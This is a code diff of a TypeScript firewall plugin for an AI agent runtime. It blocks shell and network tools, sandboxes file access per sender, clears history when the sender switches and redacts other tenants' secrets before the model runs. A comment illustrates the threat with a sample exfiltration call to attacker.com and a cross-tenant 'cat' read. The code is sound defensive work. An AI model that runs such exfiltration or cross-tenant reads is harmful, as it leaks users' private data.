+        // assistant's reply text. Fire-and-forget — the dashboard
+        // and webhook layers consume this, but we do NOT use it
+        // for in-flight rewriting. Output-side rewriting was
+        // proven leaky (TENANT_ISOLATION_SPEC.md §0); prevention
+        // happens at L1 (storage sandbox) and L3 (input
+        // redaction). This call's verdict is observation only.
+        if (enforceEnabled) {
+          const assistantText = Array.isArray(event.assistantTexts)
+            ? event.assistantTexts
+                .filter((s): s is string => typeof s === "string")
+                .join("\n")
+            : "";
+          if (assistantText) {
+            void fw.decide({
+              lifecycle: "after_proxy_call",
+              output: { text: assistantText },
+              trace_id: ctx?.trace?.traceId
+                ? asUuid(ctx.trace.traceId, event.runId ?? "_")
+                : undefined,
+              span_id: ctx?.trace?.spanId
+                ? asUuid(ctx.trace.spanId, `${event.runId ?? "_"}:llm_out`)
+                : undefined,
+              session_id: ctx?.sessionId,
+              user_id: userId,
+              agent: ctx?.agentId,
+              project: cfg.project || DEFAULT_PROJECT,
+            }).catch(() => {});
+          }
+        }
       } catch (err) {
         log?.warn?.(`lumin-diagnostics: llm_output handler failed: ${(err as Error).message}`);
       }
@@ -1174,12 +1863,35 @@ export default definePluginEntry({
     // register without any extra config beyond what llm_input already
     // required for this plugin.
     apiAny.on("before_tool_call", async (rawEvent: unknown, rawCtx: unknown) => {
+      // Wait briefly for the initial dashboard merge so the very first
+      // tool call after gateway boot doesn't run against stale openclaw.json
+      // defaults when the operator has different settings in the UI.
+      // Capped at 1s — Lumin outage must not freeze the agent.
+      await awaitInitialDashboardMerge();
+      // Per-agent settings: refresh from /v1/admin/firewall/profile
+      // when the active agentId differs from the last fetch. TTL-cached
+      // inside fetchDashboardProfile so rapid switches don't thrash.
+      await ensureAgentSettings((rawCtx as HookContext | undefined)?.agentId);
+
       // Tracking ledger first — we want the start timestamp recorded
       // even when the firewall blocks the call so the resulting "blocked"
       // span has a sensible started_at.
       try {
         const event = rawEvent as BeforeToolCallEvent;
         const ctx = rawCtx as HookContext | undefined;
+        // v0.7.0-debug: log every before_tool_call so we can see why
+        // the sandbox isn't firing in some deployments. Includes the
+        // tool name, the path-like params, the sender, and whether
+        // workspaceDir was on the hook context. Verbose; remove once
+        // the sandbox path is confirmed working in production.
+        const dbgPath = (event.params as { path?: unknown } | undefined)?.path;
+        log?.info?.(
+          `lumin-diagnostics: before_tool_call entry tool=${event.toolName} ` +
+          `path=${typeof dbgPath === "string" ? dbgPath : "<none>"} ` +
+          `hasWorkspaceDir=${!!(ctx as { workspaceDir?: string } | undefined)?.workspaceDir} ` +
+          `sender=${resolveUserId(undefined, ctx) ?? "<none>"} ` +
+          `sessionKey=${ctx?.sessionKey ?? "<none>"}`,
+        );
         toolPending.set(toolCallKey(event.runId, event.toolCallId, event.toolName), {
           startedAt: nowIso(),
           startedAtMs: Date.now(),
@@ -1191,6 +1903,179 @@ export default definePluginEntry({
 
         // ----- firewall decision (v0.2.0) ---------------------------
         if (!enforceEnabled) return;
+
+        // ----- v0.7.0 L1.5 deny-by-default (TENANT_ISOLATION_SPEC §2.2) ---
+        // Tools that bypass the filesystem sandbox by definition.
+        // Two classes:
+        //   - Code-exec / shell:  "cat /other-tenant/secret" reads
+        //     foreign data without going through fs tools.
+        //   - Network egress:     "web_fetch(http://attacker.com?leak=...)"
+        //     exfiltrates data through URL params or POST bodies; no
+        //     fs tool involved, no sandbox trigger.
+        // Both classes default to deny. Operators who legitimately
+        // need them opt specific tools in by overriding ``deniedTools``
+        // (or by waiting for the v0.8.0 per-sender egress allowlist).
+        // Default list comes from the active securityProfile.
+        const deniedTools = settings.deniedTools;
+        if (deniedTools.includes(event.toolName)) {
+          recordRecentBlock(ctx?.sessionKey);
+          const denySender = resolveUserId(undefined, ctx) ?? "?";
+          log?.warn?.(
+            `lumin-diagnostics: tool denied (tool=${event.toolName} ` +
+            `sender=${denySender} reason=L1.5_deny_by_default)`,
+          );
+          // L4 audit completeness: the SOC dashboard pulls from
+          // /v1/violations. Without this fire-and-forget row, an
+          // operator querying "show me all blocked tool calls today"
+          // sees nothing — the deny only lives in plugin stdout.
+          // Synthetic policy_name documents the deny class; the
+          // actual_value carries the original tool params for
+          // forensic reconstruction.
+          //
+          // Slice 4: sampled by ``auditSamplingRate`` (0..1). Default
+          // 1.0 records every block; high-traffic deployments can
+          // sample to keep the violations table size manageable.
+          if (Math.random() < settings.auditSamplingRate) {
+            const traceIdForAudit = ctx?.trace?.traceId
+              ? asUuid(ctx.trace.traceId, event.runId ?? "_")
+              : asUuid(event.runId ?? `${denySender}:${event.toolName}`, "egress-deny");
+            void client.sendViolation({
+              policy_name: `lumin_egress_deny:${event.toolName}`,
+              severity: "high",
+              trace_id: traceIdForAudit,
+              span_id: ctx?.trace?.spanId
+                ? asUuid(ctx.trace.spanId, `${event.runId ?? "_"}:deny`)
+                : undefined,
+              condition_text:
+                `Tool "${event.toolName}" is on the L1.5 deny-by-default ` +
+                `list (TENANT_ISOLATION_SPEC §2.2). Bypasses the L1 ` +
+                `storage sandbox; refusing.`,
+              action_taken: "block",
+              actual_value: JSON.stringify({
+                tool: event.toolName,
+                sender: denySender,
+                params: event.params,
+              }).slice(0, 2000),
+            }).catch(() => {});
+          }
+          return {
+            block: true,
+            blockReason: `lumin_egress:exec_denied:${event.toolName}`,
+          };
+        }
+
+        // ----- v0.6.1 per-sender workspace sandbox (Path D — primary
+        // cross-session isolation defense). The bot writes user A's
+        // facts to {ws}/_lumin/by-sender/A/MEMORY.md and reads user
+        // B's facts from {ws}/_lumin/by-sender/B/MEMORY.md. The
+        // shared global MEMORY.md is no longer reachable by the
+        // sandboxed tool calls, so the LLM literally has no path to
+        // user A's data while serving user B. Channel-agnostic and
+        // SDK-agnostic — works for every transport because tool
+        // calls are upstream of channel dispatch.
+        const sandboxCtx = rawCtx as { workspaceDir?: string } | undefined;
+        // Sender resolution chain:
+        //   1. The plugin's normal resolver (ctx fields,
+        //      sessionToSender map, header propagation).
+        //   2. Fallback — parse the last ``:`` segment of the
+        //      sessionKey when it looks like a real id. OpenClaw
+        //      2026.5.x has been observed to fire before_tool_call
+        //      with a sessionKey whose tail is the senderId
+        //      (e.g. ``agent:main:telegram:default:direct:5706212396``)
+        //      but the senderId field itself is empty. Without this
+        //      fallback the sandbox can't bind the call to a tenant.
+        let senderId = resolveUserId(undefined, ctx);
+        if (!senderId && ctx?.sessionKey) {
+          const m = ctx.sessionKey.match(
+            /:((?:\d{4,})|U[0-9A-Z]{6,}|W[0-9A-Z]{6,})$/,
+          );
+          if (m) senderId = m[1];
+        }
+        // Workspace resolution chain:
+        //   1. ctx.workspaceDir (the documented SDK contract).
+        //   2. Plugin config ``workspaceDir`` — explicit operator
+        //      override for runtimes where the SDK contract isn't
+        //      honoured (observed 2026.5.x). Without this the
+        //      sandbox silently no-ops and writes hit the shared
+        //      workspace — i.e. the cross-session leak the
+        //      sandbox was built to block.
+        const workspaceDir = sandboxCtx?.workspaceDir ?? cfg.workspaceDir;
+        const sandboxResult = sandboxToolParams({
+          toolName: event.toolName,
+          params: (event.params || {}) as Record<string, unknown>,
+          senderId,
+          workspaceDir,
+          sharedPaths: cfg.sharedPaths,
+          failClosed: settings.failClosedOnMissingWorkspace,
+        });
+        if (sandboxResult?.kind === "block") {
+          // Fail-closed: the sandbox layer refused this call (no
+          // workspaceDir, or write to a shared read-only path).
+          // Record a recent-block marker so the user-side reply
+          // takeover suppresses the LLM's follow-up text.
+          recordRecentBlock(ctx?.sessionKey);
+          log?.warn?.(
+            `lumin-diagnostics: sandbox BLOCK ` +
+            `(tool=${event.toolName} sender=${senderId ?? "?"} ` +
+            `reason=${sandboxResult.reason})`,
+          );
+          // L4 audit row — same rationale + sampling as the L1.5 deny above.
+          if (Math.random() < settings.auditSamplingRate) {
+            const traceIdForAudit = ctx?.trace?.traceId
+              ? asUuid(ctx.trace.traceId, event.runId ?? "_")
+              : asUuid(event.runId ?? `${senderId ?? "_"}:${event.toolName}`, "sandbox-block");
+            void client.sendViolation({
+              policy_name: `lumin_sandbox_block:${sandboxResult.reason}`,
+              severity: "high",
+              trace_id: traceIdForAudit,
+              span_id: ctx?.trace?.spanId
+                ? asUuid(ctx.trace.spanId, `${event.runId ?? "_"}:sandbox-block`)
+                : undefined,
+              condition_text:
+                `Sandbox refused tool "${event.toolName}" — reason ` +
+                `${sandboxResult.reason} (TENANT_ISOLATION_SPEC §2.1).`,
+              action_taken: "block",
+              actual_value: JSON.stringify({
+                tool: event.toolName,
+                sender: senderId ?? null,
+                params: event.params,
+              }).slice(0, 2000),
+            }).catch(() => {});
+          }
+          return {
+            block: true,
+            blockReason: `lumin_sandbox:${sandboxResult.reason}`,
+          };
+        }
+        if (sandboxResult?.kind === "shared") {
+          for (const m of sandboxResult.sharedMatches) {
+            log?.info?.(
+              `lumin-diagnostics: shared-path passthrough ` +
+              `(tool=${event.toolName} sender=${senderId ?? "?"} ` +
+              `pattern=${m.pattern} resolved=${m.resolved})`,
+            );
+          }
+          event.params = sandboxResult.params as never;
+          return { params: sandboxResult.params };
+        }
+        if (sandboxResult?.kind === "rewrite") {
+          for (const r of sandboxResult.rewrittenPaths) {
+            log?.info?.(
+              `lumin-diagnostics: sandbox rewrite ` +
+              `(tool=${event.toolName} sender=${senderId ?? "?"} ` +
+              `original=${r.original} rewritten=${r.rewritten})`,
+            );
+          }
+          // Replace event.params for downstream code (the standard
+          // before_tool_call decide call below sees the sandboxed
+          // path so any path-based rules see the right value).
+          event.params = sandboxResult.params as never;
+          // Return the rewritten params so OpenClaw runs the tool
+          // against the sandboxed path. before_tool_call IS awaited
+          // and honors {params: ...} verbatim.
+          return { params: sandboxResult.params };
+        }
+
         const decision = await fw.decide({
           lifecycle: "before_tool_call",
           tool_name: event.toolName,
@@ -1252,7 +2137,8 @@ export default definePluginEntry({
           trace: ctx?.trace,
           runId: event.runId,
         };
-        const span = buildSpanFromToolCall(entry, event, cfg, ctx);
+        const userId = resolveUserId(undefined, ctx);
+        const span = buildSpanFromToolCall(entry, event, cfg, ctx, userId);
         void client.send(span).catch(() => {});
       } catch (err) {
         log?.warn?.(`lumin-diagnostics: after_tool_call handler failed: ${(err as Error).message}`);
@@ -1556,6 +2442,10 @@ export default definePluginEntry({
               input: stringify(userMessage, cfg.maxContentChars ?? DEFAULT_MAX_CONTENT_CHARS),
               output: text,
               session_id: sessionKey,
+              // v0.6.1 — propagate sender identity into the trace
+              // row so the cross-session vault detector can record
+              // facts from the takeover's user input.
+              user_id: resolveUserId({ senderId, sessionKey }, undefined),
               metadata: {
                 // Keeps chat-shape detection happy — without one of
                 // these the dashboard would route this trace to the
@@ -1620,12 +2510,15 @@ export default definePluginEntry({
       }
     });
 
-    apiAny.on("message_sending", (rawEvent: unknown, rawCtx: unknown) => {
+    apiAny.on("message_sending", async (rawEvent: unknown, rawCtx: unknown) => {
       try {
+        const event = rawEvent as { content?: string } | undefined;
         const ctx = rawCtx as {
           sessionKey?: string;
           runId?: string;
           senderId?: string;
+          sessionId?: string;
+          agentId?: string;
         } | undefined;
         const sessionKey = ctx?.sessionKey;
         const runId = ctx?.runId;
@@ -1660,18 +2553,79 @@ export default definePluginEntry({
         }
 
         // ----- recent-block (tool-side / output-side suppression) ----
-        if (!sessionKey) return undefined;
-        if (!hasRecentBlock(sessionKey)) return undefined;
+        if (sessionKey && hasRecentBlock(sessionKey)) {
+          const senderId = ctx?.senderId ?? sessionToSender.get(sessionKey);
+          const isAdmin = isAdminSender(senderId);
+          if (!(isAdmin && adminSeesFullResponse)) {
+            log?.info?.(
+              `lumin-diagnostics: message_sending recent-block suppression ` +
+              `(sessionKey=${sessionKey} senderIsAdmin=${isAdmin})`,
+            );
+            return { content: userBlockedMessage };
+          }
+        }
 
-        const senderId = ctx?.senderId ?? sessionToSender.get(sessionKey);
-        const isAdmin = isAdminSender(senderId);
-        if (isAdmin && adminSeesFullResponse) return undefined;
-
-        log?.info?.(
-          `lumin-diagnostics: message_sending recent-block suppression ` +
-          `(sessionKey=${sessionKey} senderIsAdmin=${isAdmin})`,
+        // ----- v0.6.1 in-flight after_proxy_call decision -------------
+        // This is the LAST hook before chat.postMessage / Telegram
+        // bot send — by here the LLM has produced its full reply
+        // text in event.content and OpenClaw is about to deliver it.
+        // Calling fw.decide(after_proxy_call) here lets cross-session
+        // leak / PII / system-prompt-leak rules actually REWRITE the
+        // outbound text rather than just observe it (the llm_output
+        // path was observational because the channel send happens
+        // concurrently with that hook). Block / rewrite verdicts
+        // overwrite event.content; allow / flag pass through.
+        if (!enforceEnabled) return undefined;
+        const outboundText =
+          typeof event?.content === "string" ? event.content : "";
+        if (!outboundText) return undefined;
+        const senderId = ctx?.senderId
+          ?? (sessionKey ? sessionToSender.get(sessionKey) : undefined);
+        const userId = resolveUserId(
+          { senderId, sessionKey } as never,
+          ctx as unknown as HookContext | undefined,
         );
-        return { content: userBlockedMessage };
+        try {
+          const decision = await fw.decide({
+            lifecycle: "after_proxy_call",
+            output: { text: outboundText },
+            session_id: ctx?.sessionId,
+            user_id: userId,
+            agent: ctx?.agentId,
+            project: cfg.project || DEFAULT_PROJECT,
+          });
+          if (decision && decision.decision === "block") {
+            if (sessionKey) recordRecentBlock(sessionKey);
+            log?.info?.(
+              `lumin-diagnostics: message_sending block ` +
+              `(sessionKey=${sessionKey ?? "?"} policy=${decision.policy_name ?? "?"} ` +
+              `decision_id=${decision.decision_id ?? "?"})`,
+            );
+            return { content: cfg.userBlockedMessage ?? DEFAULT_USER_BLOCKED_MESSAGE };
+          }
+          if (decision && decision.decision === "rewrite") {
+            const redacted =
+              (decision.rewritten?.result as string | undefined) ?? outboundText;
+            if (redacted !== outboundText) {
+              log?.info?.(
+                `lumin-diagnostics: message_sending rewrite ` +
+                `(sessionKey=${sessionKey ?? "?"} policy=${decision.policy_name ?? "?"} ` +
+                `decision_id=${decision.decision_id ?? "?"} ` +
+                `before=${outboundText.length} after=${redacted.length})`,
+              );
+              return { content: redacted };
+            }
+          }
+          // allow / flag / no rewrite needed → pass through unchanged
+        } catch (err) {
+          // Rule 7 — never fail-closed on a decide error in the
+          // outbound path; that would suppress every reply if the
+          // API hiccups.
+          log?.warn?.(
+            `lumin-diagnostics: message_sending decide failed: ${(err as Error).message}`,
+          );
+        }
+        return undefined;
       } catch (err) {
         log?.warn?.(
           `lumin-diagnostics: message_sending handler failed: ${(err as Error).message}`,
@@ -1682,18 +2636,20 @@ export default definePluginEntry({
 
     apiAny.on("before_message_write", (rawEvent: unknown, rawCtx: unknown) => {
       try {
-        const ctx = rawCtx as { sessionKey?: string; runId?: string } | undefined;
+        const event = rawEvent as {
+          message?: {
+            role?: string;
+            content?: unknown;
+          };
+        } | undefined;
+        const ctx = rawCtx as {
+          sessionKey?: string;
+          runId?: string;
+          sessionId?: string;
+          agentId?: string;
+        } | undefined;
         const sessionKey = ctx?.sessionKey;
         const runId = ctx?.runId;
-
-        // v0.5.3 debug — temporary diagnostic until takeover is
-        // confirmed working in production.
-        log?.info?.(
-          `lumin-diagnostics: before_message_write fired ` +
-          `(sessionKey=${sessionKey ?? "?"} runId=${runId ?? "?"} ` +
-          `recentBlock=${sessionKey ? hasRecentBlock(sessionKey) : false} ` +
-          `inputMarker=${runId ? !!inputBlocked.peek(runId) : false})`,
-        );
 
         // ----- v0.5.3 takeover path (input-side block) ----------------
         // Check the input-blocked marker FIRST — it's set by
@@ -1739,27 +2695,26 @@ export default definePluginEntry({
         // recordRecentBlock from before_tool_call,
         // before_agent_reply, etc.) suppress the LLM's interim
         // reasoning for non-admin senders.
-        if (!sessionKey) return undefined;
-        if (!hasRecentBlock(sessionKey)) return undefined;
-
-        const senderId = sessionToSender.get(sessionKey);
-        const isAdmin = isAdminSender(senderId);
-        if (isAdmin && adminSeesFullResponse) {
-          // Admin sees the full LLM reply. They can drill into
-          // /decisions for the policy-side context.
-          return undefined;
+        if (sessionKey && hasRecentBlock(sessionKey)) {
+          const senderId = sessionToSender.get(sessionKey);
+          const isAdmin = isAdminSender(senderId);
+          if (!(isAdmin && adminSeesFullResponse)) {
+            const cannedMessage = {
+              role: "assistant" as const,
+              content: [{ type: "text" as const, text: userBlockedMessage }],
+            };
+            return { message: cannedMessage as never };
+          }
         }
 
-        // Replace the LLM's message with a canned, neutral
-        // refusal. We use the AgentMessage shape OpenClaw expects
-        // — content array with a single text block. No mention
-        // of policy names, no /approve syntax, no technical
-        // detail.
-        const cannedMessage = {
-          role: "assistant" as const,
-          content: [{ type: "text" as const, text: userBlockedMessage }],
-        };
-        return { message: cannedMessage as never };
+        // No output-side rewriting here. Per
+        // TENANT_ISOLATION_SPEC.md §0, output rewriting was
+        // proven leaky on Slack (chat.update fires AFTER
+        // chat.postMessage already flashed the original to the
+        // recipient's notification + lock-screen + first-paint
+        // UI). Prevention happens at L1 (storage sandbox) and
+        // L3 (input redaction); this hook stays observational.
+        return undefined;
       } catch (err) {
         log?.warn?.(
           `lumin-diagnostics: before_message_write handler failed: ${(err as Error).message}`,
@@ -1784,10 +2739,128 @@ export default definePluginEntry({
     // the injection — the rule is observation-only and we don't
     // want to influence model behavior.
     apiAny.on("before_prompt_build", async (rawEvent: unknown, rawCtx: unknown) => {
+      // Same race-protection as before_tool_call.
+      await awaitInitialDashboardMerge();
+      // Per-agent settings refresh when the active agent changes.
+      await ensureAgentSettings((rawCtx as HookContext | undefined)?.agentId);
       if (!enforceEnabled) return undefined;
       try {
-        const event = rawEvent as { prompt: string; messages: unknown[] };
+        const event = rawEvent as {
+          prompt?: string;
+          messages?: unknown[];
+          systemPrompt?: string;
+        };
         const ctx = rawCtx as HookContext | undefined;
+        // Sender resolution with sessionKey-tail fallback (same
+        // chain we use in before_tool_call). OpenClaw 2026.5.x
+        // doesn't always populate user_id directly, but the
+        // sessionKey carries it as the trailing segment for both
+        // Telegram (numeric) and Slack (U-prefix) channel paths.
+        let userId = resolveUserId(undefined, ctx);
+        if (!userId && ctx?.sessionKey) {
+          const m = ctx.sessionKey.match(
+            /:((?:\d{4,})|U[0-9A-Z]{6,}|W[0-9A-Z]{6,})$/,
+          );
+          if (m) userId = m[1];
+        }
+
+        // ----- v0.7.0 L2 — per-sender conversation isolation ----------
+        // TENANT_ISOLATION_SPEC §2.3: agent conversation memory MUST
+        // be partitioned by sender. OpenClaw 2026.5.x shares one
+        // agent instance across senders that hit the same channel
+        // set — Telegram + Slack messages on the "main" agent share
+        // an in-memory message buffer. Result: foreign-tenant text
+        // from a prior turn lives in the LLM's context, and the
+        // model recites it in response to the next sender's prompt.
+        //
+        // Three modes (cfg.l2HistoryResetMode):
+        //   - "clear-on-switch" (default): track last sender per
+        //     agentId, clear messages on switch. Strictest. Same
+        //     user across multiple channels loses history.
+        //   - "scope-by-channel": track last sender per
+        //     (agentId, channel) tuple. Same user keeps history
+        //     across the same channel; switch within a channel
+        //     still clears. Better UX for multi-transport users.
+        //   - "off": no clearing. Only safe when the agent runtime
+        //     guarantees per-sender contexts architecturally.
+        const l2Mode = settings.l2HistoryResetMode;
+        if (l2Mode !== "off" && userId) {
+          const l2Globals = globalThis as unknown as {
+            __lumin_lastSenderByAgent?: Map<string, string>;
+          };
+          if (!l2Globals.__lumin_lastSenderByAgent) {
+            l2Globals.__lumin_lastSenderByAgent = new Map();
+          }
+          const lastSenderByAgent = l2Globals.__lumin_lastSenderByAgent;
+          // Build the tracking key. ``scope-by-channel`` extracts
+          // the channel from sessionKey — patterns we observe:
+          //   "agent:main:telegram:default:direct:<senderId>"
+          //   "agent:main:slack:channel:<channelId>"
+          // The 3rd segment is the channel name. Fall back to
+          // agentId-only when the sessionKey doesn't fit.
+          const agentId = ctx?.agentId ?? "_default";
+          let trackingKey = agentId;
+          if (l2Mode === "scope-by-channel" && ctx?.sessionKey) {
+            const channelMatch = ctx.sessionKey.match(/^agent:[^:]+:([a-z]+):/);
+            if (channelMatch) {
+              trackingKey = `${agentId}:${channelMatch[1]}`;
+            }
+          }
+          const last = lastSenderByAgent.get(trackingKey);
+          if (last && last !== userId) {
+            const cleared = Array.isArray(event.messages) ? event.messages.length : 0;
+            log?.warn?.(
+              `lumin-diagnostics: L2 sender-switch ` +
+              `(mode=${l2Mode} key=${trackingKey} prev=${last} current=${userId}); ` +
+              `clearing ${cleared} prior message(s) from prompt context`,
+            );
+            if (Array.isArray(event.messages)) {
+              event.messages.length = 0;
+            }
+            // We deliberately keep event.systemPrompt — it's static
+            // operator content, not tenant data. If an operator
+            // bakes foreign-tenant data into systemPrompt, that's
+            // a different bug class (operator-misconfigured shared
+            // prompt) and L3 redaction below will catch it.
+          }
+          lastSenderByAgent.set(trackingKey, userId);
+        }
+
+        // ----- v0.6.1 Path A — input-side context redaction -----------
+        // THIS is the only place we can stop a cross-session leak
+        // *before* the LLM runs. The hook is async-aware AND awaited
+        // by OpenClaw, and we have direct mutable access to
+        // ``event.prompt``, ``event.systemPrompt``, and every message
+        // in ``event.messages``. Strip every foreign-user vault
+        // excerpt out of all of them, in place. Result: the LLM
+        // never has the secret in its context, so it physically
+        // cannot leak it. (Output-side rewrite was fundamentally
+        // leaky on Slack — chat.postMessage flashes the original
+        // before chat.update can redact, so the recipient's mobile
+        // notification + lock-screen + first ~500ms of UI all show
+        // the secret. Live brutal-test 2026-05-10 confirmed.)
+        if (userId) {
+          try {
+            await redactForeignUserSecrets(
+              event,
+              userId,
+              cfg.host || DEFAULT_HOST,
+              cfg.project || DEFAULT_PROJECT,
+              log,
+              // Slice 3 — forward per-detector toggles from active
+              // securityProfile + per-layer overrides.
+              settings.l3Detectors,
+            );
+          } catch (err) {
+            // Rule 7: redaction failure must not break the agent.
+            // The foreign-user lookup will retry on the next turn;
+            // log a warning so an operator notices repeated failures.
+            log?.warn?.(
+              `lumin-diagnostics: input-side redaction failed: ${(err as Error).message}`,
+            );
+          }
+        }
+
         const decision = await fw.decide({
           lifecycle: "before_proxy_call",
           messages: [
@@ -1797,7 +2870,7 @@ export default definePluginEntry({
             ? asUuid(ctx.trace.traceId, ctx?.runId ?? "_")
             : undefined,
           session_id: ctx?.sessionId,
-          user_id: resolveUserId(undefined, ctx),
+          user_id: userId,
           agent: ctx?.agentId,
           project: cfg.project || DEFAULT_PROJECT,
         });
@@ -1887,12 +2960,6 @@ export default definePluginEntry({
     // CAN short-circuit the reply via ``{ handled: true, reply }``,
     // so this is a hard-blocking hook unlike before_prompt_build.
     apiAny.on("before_agent_reply", async (rawEvent: unknown, rawCtx: unknown) => {
-      // v0.5.3 debug: confirm hook fires on every reply path. Remove
-      // once the takeover is confirmed working in production.
-      log?.info?.(
-        `lumin-diagnostics: before_agent_reply fired ` +
-        `(runId=${(rawCtx as { runId?: string } | undefined)?.runId ?? "?"})`,
-      );
       if (!enforceEnabled) return undefined;
       try {
         const event = rawEvent as { cleanedBody: string };
@@ -1932,53 +2999,20 @@ export default definePluginEntry({
               reason: `firewall_input_blocked:${marker.policyName ?? marker.decisionVerb}`,
             };
           }
-          // Admin bypass — fall through to the after_proxy_call decide
-          // path (admin sees actual LLM reply, possibly subject to
-          // post-output rules like PII redaction).
+          // Admin bypass — fall through (admin sees the actual LLM
+          // reply; output-side rules still record via llm_output).
         }
 
-        // ----- standard after_proxy_call path -------------------------
-        const decision = await fw.decide({
-          lifecycle: "after_proxy_call",
-          output: { text: typeof event.cleanedBody === "string" ? event.cleanedBody : "" },
-          trace_id: ctx?.trace?.traceId
-            ? asUuid(ctx.trace.traceId, ctx?.runId ?? "_")
-            : undefined,
-          session_id: ctx?.sessionId,
-          user_id: resolveUserId(undefined, ctx),
-          agent: ctx?.agentId,
-          project: cfg.project || DEFAULT_PROJECT,
-        });
-        if (
-          decision &&
-          ["block", "require_approval", "rewrite", "flag"].includes(decision.decision)
-        ) {
-          recordRecentBlock(ctx?.sessionKey);
-        }
-        if (decision && decision.decision === "block") {
-          return {
-            handled: true,
-            reply: {
-              text: cfg.userBlockedMessage ?? DEFAULT_USER_BLOCKED_MESSAGE,
-            },
-            reason: `firewall:${decision.policy_name ?? "blocked"}`,
-          };
-        }
-        if (decision && decision.decision === "rewrite") {
-          // The redacted text comes back in ``rewritten.result`` for
-          // proxy lifecycles; fall back to the canned message if the
-          // server didn't provide one.
-          const redacted =
-            (decision.rewritten?.result as string | undefined) ??
-            cfg.userBlockedMessage ?? DEFAULT_USER_BLOCKED_MESSAGE;
-          return {
-            handled: true,
-            reply: { text: redacted },
-            reason: `firewall_rewrite:${decision.policy_name ?? "rewrite"}`,
-          };
-        }
-        // allow / flag / require_approval (the latter doesn't make
-        // sense at after_proxy_call but degrade safely): pass through.
+        // No standard after_proxy_call decide call here. The hook's
+        // event.cleanedBody is the user's *input*, not the assistant's
+        // reply — calling fw.decide(after_proxy_call) here would
+        // evaluate output-side rules against input text, which both
+        // misses real leaks and false-flags benign user prompts.
+        // The actual after_proxy_call evaluation happens in
+        // ``llm_output`` where ``assistantTexts`` carries the model's
+        // real response (v0.6.1 brutal-test fix). The block/rewrite
+        // verdict here is observational; it can't intercept the
+        // outbound message in flight on every channel.
         return undefined;
       } catch (err) {
         log?.warn?.(
